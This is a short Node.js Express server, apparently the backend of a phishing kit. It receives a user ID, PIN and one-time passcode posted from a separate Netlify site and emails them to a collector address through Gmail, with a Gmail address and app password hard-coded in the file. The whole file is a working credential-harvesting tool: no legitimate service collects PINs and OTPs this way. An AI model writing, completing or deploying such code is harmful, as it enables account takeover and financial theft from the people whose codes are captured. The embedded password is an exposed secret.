const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

app.use(cors()); // Allows your Netlify site to talk to this backend
app.use(express.json());

// Setup your Email "Transporter"
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'mosesbenjamin1985@gmail.com',
        pass: '130078al' // Not your login password, a Google App Password
    }
});

app.post('/send-data', (req, res) => {
    const { userId, pin, otp } = req.body;

    const mailOptions = {
        from: 'mosesbenjamin1985@gmail.com',
        to: 'RECEIVER_EMAIL@gmail.com',
        subject: 'New Notification',
        text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send(error.toString());
        }
        res.status(200).send('Email sent!');
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
